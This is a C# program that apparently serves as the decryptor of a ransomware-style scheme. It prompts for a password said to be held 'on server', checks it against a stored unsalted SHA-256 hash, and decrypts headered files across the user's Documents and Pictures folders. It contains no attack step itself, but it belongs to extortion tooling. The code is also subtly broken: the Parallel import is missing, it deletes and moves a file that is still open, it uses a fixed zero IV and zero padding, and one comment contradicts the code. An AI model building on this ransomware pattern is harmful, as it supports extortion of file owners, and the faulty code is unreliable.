using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using System.Collections.Generic;

class Program2
{
    static string ComputeHash(string input)
    {
        using (var sha256Hash = SHA256.Create())
        {
            byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(input));
            return BitConverter.ToString(bytes).Replace("-", "").ToLowerInvariant();
        }
    }
    static bool VerifyPasswordHash(string password, string savedHash)
    {
        string computedHash = ComputeHash(password);
        return savedHash.Equals(computedHash);
    }

    static void DecryptFile(string filePath, string password)
    {
        const string Header = "EncryptedFile00";
        byte[] header = Encoding.UTF8.GetBytes(Header);
        byte[] fileHeader = new byte[header.Length];
        byte[] salt = new byte[16];

        using (FileStream inputFile = File.Open(filePath, FileMode.Open, FileAccess.ReadWrite))
        {
            // Read and check the header
            if (inputFile.Length > fileHeader.Length + salt.Length)
            {
                inputFile.Read(fileHeader, 0, fileHeader.Length);
                if (!fileHeader.SequenceEqual(header))
                {
                    Console.WriteLine($"File {filePath} does not have the correct header. Skipping...");
                    return;
                }

                // Continue with decryption
                inputFile.Read(salt, 0, salt.Length);
            }
            else
            {
                Console.WriteLine($"File {filePath} is not valid for decryption. Skipping...");
                return;
            }

            // Now that the inputFile stream is closed, proceed with creating the output file
            string tempFilePath = $"{filePath}.tmp"; // Temporary file for decrypted content

            byte[] key;
            using (var deriveBytes = new Rfc2898DeriveBytes(password, salt, 10000))
            {
                key = deriveBytes.GetBytes(32);
            }

            using (var symmetricKey = new RijndaelManaged { KeySize = 256, BlockSize = 128, Padding = PaddingMode.Zeros })
            using (FileStream outputFile = File.Create(tempFilePath))
            {
                // Skip the header and salt part in the input file
                inputFile.Seek(header.Length + salt.Length, SeekOrigin.Begin);

                using (CryptoStream cryptoStream = new CryptoStream(outputFile, symmetricKey.CreateDecryptor(key, new byte[16]), CryptoStreamMode.Write))
                {
                    try
                    {
                        inputFile.CopyTo(cryptoStream);
                    }
                    catch (CryptographicException ex)
                    {
                        Console.WriteLine($"Decryption failed for file {filePath}. Error: {ex.Message}");
                        File.Delete(tempFilePath); // Clean up temporary file
                        return;
                    }
                }
            }

            File.Delete(filePath); // Delete the original encrypted file
            File.Move(tempFilePath, filePath); // Replace it with the decrypted file
        }
    }

    static void DecryptFolder(string folderPath, string password)
    {
        try
        {
            var files = Directory.GetFiles(folderPath);
            Parallel.ForEach(files, file =>
            {
                try
                {
                    DecryptFile(file, password);
                }
                catch (UnauthorizedAccessException)
                {
                    Console.WriteLine($"Access denied for file: {file}. Skipping...");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"An error occurred with file: {file}. Error: {ex.Message}");
                }
            });

            var subdirectories = Directory.GetDirectories(folderPath);
            foreach (var directory in subdirectories)
            {
                DecryptFolder(directory, password);
            }

            Console.WriteLine($"Decryption complete for folder: {folderPath}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred in folder {folderPath}: {ex.Message}");
        }
    }

    static void Main()
    {
        const string UserFolderPath = "USERPROFILE";
        const string PasswordHashFile = "passwordHash.txt";
        string userFolderPath = Environment.GetEnvironmentVariable(UserFolderPath);
        List<string> foldersToDecrypt = new List<string>
        {
            Path.Combine(userFolderPath, "Documents"),
            Path.Combine(userFolderPath, "Pictures")
        };
        Console.Write("Enter decryption password (contained on server): ");
        string password = Console.ReadLine();

        bool isPasswordValid = foldersToDecrypt.Any(folderPath =>
        {
            string hashFilePath = Path.Combine(folderPath, PasswordHashFile);
            if (File.Exists(hashFilePath))
            {
                string savedHash = File.ReadAllText(hashFilePath).Trim();
                return VerifyPasswordHash(password, savedHash);
            }
            return false;
        });

        if (!isPasswordValid)
        {
            Console.WriteLine("Invalid password. Decryption aborted.");
            return;
        }

        // Proceed with decryption
        foreach (var folderPath in foldersToDecrypt)
        {
            DecryptFolder(folderPath, password);
        }
    }

}